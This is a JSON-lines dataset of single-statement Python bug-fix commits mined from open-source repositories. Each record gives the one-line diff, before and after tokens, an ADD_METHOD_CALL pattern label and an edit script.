{"project": "salt", "commit_sha": "d0928a651331fc5d27ac61f9a9ff2d3e411aa249", "parent_sha": "f26ee8480b24f873f8e22cf97409476948cd656b", "file_path": "salt/modules/win_pkg.py", "project_url": "https://github.com/StepOneInc/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -139,7 +139,7 @@ def list_upgrades(refresh=True):\n         refresh_db()\n \n     ret = {}\n-    for name, data in get_repo_data().items():\n+    for name, data in get_repo_data().get('repo', {}).items():\n         if version(name):\n             latest = latest_version(name)\n             if latest:\n", "before": "for name , data in get_repo_data ( ) . items ( ) : if version ( name ) : latest = latest_version ( name ) if latest : ", "after": "for name , data in get_repo_data ( ) . get ( 'repo' , { } ) . items ( ) : if version ( name ) : latest = latest_version ( name ) if latest : ", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 23, 3, 38], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 23, 3, 38], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 23, 3, 38], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:get\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"string:'repo'\", \"T\"], 1], [\"Insert\", \"N1\", [\",:,\", \"T\"], 2], [\"Insert\", \"N1\", [\"dictionary\", \"N2\"], 3], [\"Insert\", \"N1\", [\"):)\", \"T\"], 4], [\"Insert\", \"N2\", [\"{:{\", \"T\"], 0], [\"Insert\", \"N2\", [\"}:}\", \"T\"], 1]]"}
{"project": "salt", "commit_sha": "83dffd660071d8ddc82df58f63f97766e746fab4", "parent_sha": "87a88d0137b4339b892b8b607d364ae7703ba0ac", "file_path": "salt/modules/win_pkg.py", "project_url": "https://github.com/StepOneInc/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -139,7 +139,7 @@ def list_upgrades(refresh=True):\n         refresh_db()\n \n     ret = {}\n-    for name, data in get_repo_data().items():\n+    for name, data in get_repo_data().get('repo', {}).items():\n         if version(name):\n             latest = latest_version(name)\n             if latest:\n", "before": "for name , data in get_repo_data ( ) . items ( ) : if version ( name ) : latest = latest_version ( name ) if latest : ", "after": "for name , data in get_repo_data ( ) . get ( 'repo' , { } ) . items ( ) : if version ( name ) : latest = latest_version ( name ) if latest : ", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 23, 3, 38], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 23, 3, 38], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 23, 3, 38], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:get\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"string:'repo'\", \"T\"], 1], [\"Insert\", \"N1\", [\",:,\", \"T\"], 2], [\"Insert\", \"N1\", [\"dictionary\", \"N2\"], 3], [\"Insert\", \"N1\", [\"):)\", \"T\"], 4], [\"Insert\", \"N2\", [\"{:{\", \"T\"], 0], [\"Insert\", \"N2\", [\"}:}\", \"T\"], 1]]"}
{"project": "salt", "commit_sha": "7fa1142ff7e2e92cb4f2cc85ad5085d7ae38efa0", "parent_sha": "ca03400c1c774ddcf6e307b3680db08938950dd0", "file_path": "salt/states/module.py", "project_url": "https://github.com/StepOneInc/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -211,7 +211,7 @@ def run(name, **kwargs):\n             returners[kwargs['returner']](ret_ret)\n     ret['comment'] = 'Module function {0} executed'.format(name)\n     ret['result'] = True\n-    if ret['changes'].get('retcode', 0) != 0:\n+    if ret['changes'].get('ret', {}).get('retcode', 0) != 0:\n         ret['result'] = False\n     return ret\n \n", "before": "if ret [ 'changes' ] . get ( 'retcode' , 0 ) != 0 : ret [ 'result' ] = False", "after": "if ret [ 'changes' ] . get ( 'ret' , { } ) . get ( 'retcode' , 0 ) != 0 : ret [ 'result' ] = False", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"attribute\", 3, 8, 3, 26], [\"call\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 8, 3, 26], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 8, 3, 26], [\"identifier:get\", \"T\"], 2], [\"Move\", \"N0\", [\"attribute\", 3, 8, 3, 26], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"string:'ret'\", \"T\"], 1], [\"Insert\", \"N1\", [\",:,\", \"T\"], 2], [\"Insert\", \"N1\", [\"dictionary\", \"N2\"], 3], [\"Insert\", \"N1\", [\"):)\", \"T\"], 4], [\"Insert\", \"N2\", [\"{:{\", \"T\"], 0], [\"Insert\", \"N2\", [\"}:}\", \"T\"], 1]]"}
{"project": "server-tools", "commit_sha": "b193f4c38f30390f6429352b26d83a1a19f0a959", "parent_sha": "4e0c1ee642271ba8b22f6c66e9901fb848d0d447", "file_path": "base_report_auto_create_qweb/models/report_xml.py", "project_url": "https://github.com/cloud9UG/server-tools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -41,7 +41,7 @@ class IrActionsReport(models.Model):\n         self.env['ir.model.data'].create(model_data_data)\n         value_view_data = self._prepare_value_view_data(\n             name, model)\n-        self.env['ir.values'].create(value_view_data)\n+        self.env['ir.values'].sudo().create(value_view_data)\n \n     @api.model\n     def create(self, values):\n", "before": "self . env [ 'ir.values' ] . create ( value_view_data )", "after": "self . env [ 'ir.values' ] . sudo ( ) . create ( value_view_data )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"attribute\", 3, 9, 3, 37], [\"call\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 9, 3, 37], [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"subscript\", 3, 9, 3, 30], 0], [\"Move\", \"N1\", [\".:.\", 3, 30, 3, 31], 1], [\"Insert\", \"N1\", [\"identifier:sudo\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"):)\", \"T\"], 1]]"}
{"project": "server-tools", "commit_sha": "a70e13365dbf33092dec867da25ce873e401e90c", "parent_sha": "8a23567fe3e7dbe1aa84abe23d6787f628ec8420", "file_path": "auth_from_http_remote_user/controllers/main.py", "project_url": "https://github.com/cloud9UG/server-tools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -45,7 +45,7 @@ class Home(main.Home):\n             try:\n                 self._bind_http_remote_user(http.request.session.db)\n             except http.AuthenticationError:\n-                return werkzeug.exceptions.Unauthorized()\n+                return werkzeug.exceptions.Unauthorized().get_response()\n         return super(Home, self).web_client(s_action, **kw)\n \n     def _get_user_id_from_attributes(self, res_users, cr):\n", "before": "return werkzeug . exceptions . Unauthorized ( )", "after": "return werkzeug . exceptions . Unauthorized ( ) . get_response ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"attribute\", 3, 24, 3, 56], [\"call\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 24, 3, 56], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 24, 3, 56], [\"identifier:get_response\", \"T\"], 2], [\"Move\", \"N0\", [\"attribute\", 3, 24, 3, 56], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"):)\", \"T\"], 1]]"}
{"project": "celery", "commit_sha": "a179038fec68808d50c0a1f42aa26d315a3817ad", "parent_sha": "877019b4713fd7cd67f7f6eda78a41e704c2a48e", "file_path": "celery/backends/cache.py", "project_url": "https://github.com/sisyfuss/celery", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -62,7 +62,7 @@ class CacheBackend(KeyValueStoreBackend):\n         backend = backend or self.app.conf.CELERY_CACHE_BACKEND\n         self.expires = int(self.expires)\n         self.backend, _, servers = partition(backend, \"://\")\n-        self.servers = servers.split(\";\")\n+        self.servers = servers.rstrip('/').split(\";\")\n         try:\n             self.Client = backends[self.backend]\n         except KeyError:\n", "before": "self . servers = servers . split ( \";\" )", "after": "self . servers = servers . rstrip ( '/' ) . split ( \";\" )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"attribute\", 3, 24, 3, 37], [\"call\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 24, 3, 37], [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:servers\", 3, 24, 3, 31], 0], [\"Move\", \"N1\", [\".:.\", 3, 31, 3, 32], 1], [\"Insert\", \"N1\", [\"identifier:rstrip\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'/'\", \"T\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2]]"}
{"project": "https-github.com-fchollet-keras", "commit_sha": "f04272e6978662d954fc25c4d8cf9329004061f9", "parent_sha": "7401f47da4d438927b982c3dcecf07313c05ffd7", "file_path": "keras/layers/recurrent.py", "project_url": "https://github.com/amongstar/https-github.com-fchollet-keras", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -65,7 +65,7 @@ class Recurrent(MaskedLayer):\n         mask = self.get_output_mask(train)\n         if mask:\n             # apply mask\n-            X *= K.expand_dims(mask)\n+            X *= K.expand_dims(mask).astype(X.dtype)\n             masking = True\n         else:\n             masking = False\n", "before": "X *= K . expand_dims ( mask )", "after": "X *= K . expand_dims ( mask ) . astype ( X . dtype )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 18, 3, 37], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 18, 3, 37], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 18, 3, 37], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:astype\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:X\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:dtype\", \"T\"], 2]]"}
{"project": "cms", "commit_sha": "7f32d6285d38c54ca93f947223479304223f246d", "parent_sha": "c4c9926dd4d5520a828261a62d05ccb0d13a4bbe", "file_path": "cms/grading/scoretypes/Sum.py", "project_url": "https://github.com/igortereshchenko/cms", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -35,7 +35,7 @@ class Sum(ScoreTypeAlone):\n         public_score = 0.0\n         score = 0.0\n-        for public in self.public_testcases:\n+        for public in self.public_testcases.itervalues():\n             if public:\n                 public_score += self.parameters\n             score += self.parameters\n", "before": "for public in self . public_testcases : if public : public_score += self . parameters score += self . parameters", "after": "for public in self . public_testcases . itervalues ( ) : if public : public_score += self . parameters score += self . parameters", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"for_statement\", 2, 9, 5, 37], [\"call\", \"N0\"], 3], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"attribute\", 2, 23, 2, 44], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:itervalues\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"):)\", \"T\"], 1]]"}
{"project": "cms", "commit_sha": "735affb2acab5cd35be144845c46c796484e27f1", "parent_sha": "1324a6ace53674c94fc8039db05899fbf4707619", "file_path": "cms/cms/service/FileStorage.py", "project_url": "https://github.com/igortereshchenko/cms", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -276,7 +276,7 @@ class FileCacher:\n             if plus[\"path\"] != None:\n                 try:\n                     with open(plus[\"path\"], \"wb\") as f:\n-                        f.write(plus[\"data\"])\n+                        f.write(plus[\"data\"].read())\n                 except IOError as e:\n                     if callback != None:\n                         callback(bind_obj, None, plus[\"plus\"], repr(e))\n", "before": "f . write ( plus [ \"data\" ] )", "after": "f . write ( plus [ \"data\" ] . read ( ) )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 32, 3, 46], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 32, 3, 46], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"subscript\", 3, 33, 3, 45], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:read\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Move\", \"N2\", [\"):)\", 3, 45, 3, 46], 1]]"}
{"project": "test", "commit_sha": "bbcc8d1745e0dbe498e083c898dd1f90f8fdc45f", "parent_sha": "3c8de42f516bae7ef74e7ad454279d0909ab2c9f", "file_path": "bench/production_setup.py", "project_url": "https://github.com/pkapoor1/test", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -29,7 +29,7 @@ def setup_production(bench='.'):\n \tgenerate_nginx_config(bench=bench)\n \tremove_default_nginx_configs()\n \n-\tif os.path.exists('/etc/redhat-release') and get_cmd_output(\"cat /etc/redhat-release | sed 's/Linux\\ //g' | cut -d' ' -f3 | cut -d. -f1\") == '7':\n+\tif os.path.exists('/etc/redhat-release') and get_cmd_output(\"cat /etc/redhat-release | sed 's/Linux\\ //g' | cut -d' ' -f3 | cut -d. -f1\").strip() == '7':\n \t\tsupervisor_conf_filename = 'frappe.ini'\n \telse:\n \t\tsupervisor_conf_filename = 'frappe.conf'\n", "before": "if os . path . exists ( '/etc/redhat-release' ) and get_cmd_output ( \"cat /etc/redhat-release | sed 's/Linux\\ //g' | cut -d' ' -f3 | cut -d. -f1\" ) == '7' : supervisor_conf_filename = 'frappe.ini' else : supervisor_conf_filename = 'frappe.conf'", "after": "if os . path . exists ( '/etc/redhat-release' ) and get_cmd_output ( \"cat /etc/redhat-release | sed 's/Linux\\ //g' | cut -d' ' -f3 | cut -d. -f1\" ) . strip ( ) == '7' : supervisor_conf_filename = 'frappe.ini' else : supervisor_conf_filename = 'frappe.conf'", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 47, 3, 139], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 47, 3, 139], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 47, 3, 139], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:strip\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"):)\", \"T\"], 1]]"}
{"project": "https-github.com-fchollet-keras", "commit_sha": "32c507eaf81063cee449e152459b85a7037614bc", "parent_sha": "36676451c951a91dd07b272808cb21b32e931e75", "file_path": "keras/layers/recurrent.py", "project_url": "https://github.com/amongstar/https-github.com-fchollet-keras", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -55,7 +55,7 @@ class SimpleRNN(Layer):\n         mask = T.neq(X, self.mask_val).sum(axis=2) > 0 # (time, nb_samples) matrix with a 1 for every unmasked entry\n         mask = T.addbroadcast(mask[:, :, np.newaxis], 2)\n \n-        mask_tm1 = alloc_zeros_matrix(*mask.shape)\n+        mask_tm1 = alloc_zeros_matrix(*mask.shape).astype('int8')\n         mask_tm1 = T.addbroadcast(T.set_subtensor(mask_tm1[1:, :, :], mask[:-1, :, :]), 2)\n \n         x = T.dot(X, self.W) + self.b\n", "before": "mask_tm1 = alloc_zeros_matrix ( * mask . shape )", "after": "mask_tm1 = alloc_zeros_matrix ( * mask . shape ) . astype ( 'int8' )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 20, 3, 51], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 20, 3, 51], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 20, 3, 51], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:astype\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"string:'int8'\", \"T\"], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "https-github.com-fchollet-keras", "commit_sha": "5bf271858092e85164ecc309cd943d7eabdab9db", "parent_sha": "9a649d2b27c11323183da27e099bb032567624eb", "file_path": "keras/objectives.py", "project_url": "https://github.com/amongstar/https-github.com-fchollet-keras", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -35,7 +35,7 @@ def categorical_crossentropy(y_true, y_pred):\n \n def binary_crossentropy(y_true, y_pred):\n     y_pred = T.clip(y_pred, epsilon, 1.0 - epsilon)\n-    bce = T.nnet.binary_crossentropy(y_pred, y_true)\n+    bce = T.nnet.binary_crossentropy(y_pred, y_true).mean(axis=-1)\n     return bce\n \n # aliases\n", "before": "bce = T . nnet . binary_crossentropy ( y_pred , y_true )", "after": "bce = T . nnet . binary_crossentropy ( y_pred , y_true ) . mean ( axis = - 1 )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 11, 3, 53], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 11, 3, 53], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 11, 3, 53], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:mean\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"keyword_argument\", \"N2\"], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:axis\", \"T\"], 0], [\"Insert\", \"N2\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N2\", [\"unary_operator\", \"N3\"], 2], [\"Insert\", \"N3\", [\"-:-\", \"T\"], 0], [\"Insert\", \"N3\", [\"integer:1\", \"T\"], 1]]"}
{"project": "https-github.com-fchollet-keras", "commit_sha": "c515dc90d4be04454193e1b774018de28c6bcf48", "parent_sha": "818f5d7dc4035692bcd31d37658388ebeb542e5c", "file_path": "keras/layers/containers.py", "project_url": "https://github.com/amongstar/https-github.com-fchollet-keras", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -129,7 +129,7 @@ class Graph(Layer):\n         else:\n             if not connection_map:\n                 raise Exception('Cannot attach multi-input layer: no connection_map provided.')\n-            for k, v in connection_map:\n+            for k, v in connection_map.items():\n                 if k in self.inputs and v in layer.outputs:\n                     self.inputs[k].set_previous(layer.outputs[v])\n                 else:\n", "before": "for k , v in connection_map : if k in self . inputs and v in layer . outputs : self . inputs [ k ] . set_previous ( layer . outputs [ v ] ) else : ", "after": "for k , v in connection_map . items ( ) : if k in self . inputs and v in layer . outputs : self . inputs [ k ] . set_previous ( layer . outputs [ v ] ) else : ", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"for_statement\", 3, 13, 6, 22], [\"call\", \"N0\"], 3], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:connection_map\", 3, 25, 3, 39], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:items\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"):)\", \"T\"], 1]]"}
{"project": "https-github.com-fchollet-keras", "commit_sha": "11e4c4b90f3ce07b10aa06a0f117e122b0c7b368", "parent_sha": "025cd16854c6068769c6b65196390a8c8eef67af", "file_path": "keras/optimizers.py", "project_url": "https://github.com/amongstar/https-github.com-fchollet-keras", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -82,7 +82,7 @@ class SGD(Optimizer):\n         return {\"name\": self.__class__.__name__,\n                 \"lr\": float(self.lr.get_value()),\n                 \"momentum\": float(self.momentum.get_value()),\n-                \"decay\": float(self.decay),\n+                \"decay\": float(self.decay.get_value()),\n                 \"nesterov\": self.nesterov}\n \n \n", "before": "return { \"name\" : self . __class__ . __name__ , \"lr\" : float ( self . lr . get_value ( ) ) , \"momentum\" : float ( self . momentum . get_value ( ) ) , \"decay\" : float ( self . decay ) , \"nesterov\" : self . nesterov }", "after": "return { \"name\" : self . __class__ . __name__ , \"lr\" : float ( self . lr . get_value ( ) ) , \"momentum\" : float ( self . momentum . get_value ( ) ) , \"decay\" : float ( self . decay . get_value ( ) ) , \"nesterov\" : self . nesterov }", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 31, 3, 43], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 31, 3, 43], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"attribute\", 3, 32, 3, 42], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:get_value\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Move\", \"N2\", [\"):)\", 3, 42, 3, 43], 1]]"}
{"project": "mugenplcfg", "commit_sha": "f77dc1f6c97422fb003fae9f78fa43bdf80a6ca6", "parent_sha": "df4d405694210c75037a6ad1f04aa16a83759b22", "file_path": "src/creator.py", "project_url": "https://github.com/chinjieh/mugenplcfg", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -167,7 +167,7 @@ class DevicesCreator():\n \t\ttry:\n \t\t\tiomemdata = extractor.extractData(path)\n \t\t\tkeyline = parseutil.findLines(iomemdata, key)[0]\n-\t\t\tpciconfigaddr = keyline.split(\"-\")[0]\n+\t\t\tpciconfigaddr = keyline.split(\"-\")[0].lstrip()\n \n \t\texcept (customExceptions.KeyNotFound, IOError):\n \t\t\tmessage.addWarning(\"Could not obtain pciConfigAddress from %s.\" % path)\n", "before": "pciconfigaddr = keyline . split ( \"-\" ) [ 0 ]", "after": "pciconfigaddr = keyline . split ( \"-\" ) [ 0 ] . lstrip ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"assignment\", 3, 4, 3, 41], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"subscript\", 3, 20, 3, 41], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:lstrip\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"):)\", \"T\"], 1]]"}
{"project": "ipython", "commit_sha": "0aab55d359800255153b9b7ce2deb284f3c7beef", "parent_sha": "69b4a3aae4ea0ff8ab07a955c2e113cb1a275525", "file_path": "IPython/frontend/html/notebook/handlers.py", "project_url": "https://github.com/astriker/ipython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -172,7 +172,7 @@ def _on_zmq_reply(self, msg_list):\n \n class AuthenticatedZMQStreamHandler(ZMQStreamHandler):\n     def open(self, kernel_id):\n-        self.kernel_id = kernel_id\n+        self.kernel_id = kernel_id.decode('ascii')\n         self.session = Session()\n         self.save_on_message = self.on_message\n         self.on_message = self.on_first_message\n", "before": "self . kernel_id = kernel_id", "after": "self . kernel_id = kernel_id . decode ( 'ascii' )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 35], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:kernel_id\", 3, 26, 3, 35], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:decode\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'ascii'\", \"T\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2]]"}
{"project": "ipython", "commit_sha": "295a10e537a86cb4a506ea2150241b078a22c7cc", "parent_sha": "de5fd0d90c6ae7174eb917040e1c79b2ff24febc", "file_path": "IPython/html/services/notebooks/tests/test_nbmanager.py", "project_url": "https://github.com/astriker/ipython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -86,7 +86,7 @@ def test_create_notebook_model(self):\n             self.assertIn('name', model)\n             self.assertIn('path', model)\n             self.assertEqual(model['name'], 'Untitled0.ipynb')\n-            self.assertEqual(model['path'], sub_dir)\n+            self.assertEqual(model['path'], sub_dir.strip('/'))\n \n     def test_get_notebook_model(self):\n         with TemporaryDirectory() as td:\n", "before": "self . assertEqual ( model [ 'path' ] , sub_dir )", "after": "self . assertEqual ( model [ 'path' ] , sub_dir . strip ( '/' ) )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 29, 3, 53], [\"call\", \"N0\"], 3], [\"Insert\", [\"argument_list\", 3, 29, 3, 53], [\"):)\", \"T\"], 4], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:sub_dir\", 3, 45, 3, 52], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:strip\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'/'\", \"T\"], 1], [\"Move\", \"N2\", [\"):)\", 3, 52, 3, 53], 2]]"}
{"project": "pypillar", "commit_sha": "663f2a4826d6f3d43dcef99a256ef49603d20488", "parent_sha": "84b1c26219514326aa547f0139225400bd0d079f", "file_path": "pypillar/plugins/actions/pillar.py", "project_url": "https://github.com/allanhung/pypillar", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -30,7 +30,7 @@ class ActionModule(ActionBase):\n             args=v.pop('args', {})\n             func_type=args.pop('type', 'dict')\n             check_osver=args.get('check_osver', False)\n-            if 'default' in v:\n+            if 'default' in v.keys():\n                 if check_osver:\n                     func_type=type(v['default'].values()[0]).__name__\n                 else:\n", "before": "if 'default' in v : if check_osver : func_type = type ( v [ 'default' ] . values ( ) [ 0 ] ) . __name__ else : ", "after": "if 'default' in v . keys ( ) : if check_osver : func_type = type ( v [ 'default' ] . values ( ) [ 0 ] ) . __name__ else : ", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 16, 3, 30], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:v\", 3, 29, 3, 30], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:keys\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"):)\", \"T\"], 1]]"}
{"project": "Qcodes", "commit_sha": "934767db2bb90ea25d4119e1b2c0fd71819dd0c5", "parent_sha": "b9d4a6213c34d3c6a2d0283a8d0e698b8117841b", "file_path": "qcodes/utils/helpers.py", "project_url": "https://github.com/jenshnielsen/Qcodes", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -128,7 +128,7 @@ def make_sweep(start, stop, step=None, num=None):\n                 .format(steps_lo + 1, steps_hi + 1))\n         num = steps_lo + 1\n \n-    return np.linspace(start, stop, num=num)\n+    return np.linspace(start, stop, num=num).tolist()\n \n \n def wait_secs(finish_clock):\n", "before": "return np . linspace ( start , stop , num = num )", "after": "return np . linspace ( start , stop , num = num ) . tolist ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 12, 3, 45], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 12, 3, 45], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 12, 3, 45], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:tolist\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"):)\", \"T\"], 1]]"}
